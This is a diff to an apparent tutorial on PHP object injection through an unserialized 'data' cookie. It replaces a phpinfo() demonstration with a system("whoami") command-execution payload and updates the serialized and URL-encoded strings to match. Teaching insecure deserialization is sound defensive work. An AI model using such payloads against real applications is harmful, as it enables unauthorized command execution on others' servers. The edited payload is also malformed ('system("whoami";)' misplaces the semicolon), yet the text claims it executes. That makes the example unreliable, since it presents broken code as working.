@@ -158,7 +158,7 @@ In the above example, since the input ```data``` cookie is unserialized, an atta
 ```php
 class Example
 {
-    public $input = "phpinfo();";
+    public $input = 'system("whoami";)';
 }
 
 print urlencode(serialize(new Example));
@@ -167,12 +167,12 @@ print urlencode(serialize(new Example));
 The URL encoding is done since we would pass this string through a URL. The generated string looks as follows:
 
 Before URL encoding:
-```O:7:"Example":1:{s:5:"input";s:10:"phpinfo();";}```
+```O:7:"Example":1:{s:5:"input";s:17:"system("whoami";)";}```
 
 After URL encoding:
-```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A5%3A%22input%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D```
+```O%3A7%3A%22Example%22%3A1%3A%7Bs%3A5%3A%22input%22%3Bs%3A17%3A%22system%28%22whoami%22%3B%29%22%3B%7D```
 
-Passing the string above into the ```data``` cookie, the ```phpinfo()``` function will be executed. The flow of the program looks as follows:
+Passing the string above into the ```data``` cookie, the ```system()``` function will be executed. The flow of the program looks as follows:
 
 1. A serialized ```Example``` object is passed into the program as the ```data``` cookie
 2. The program calls ```unserialize()``` on the ```data``` cookie
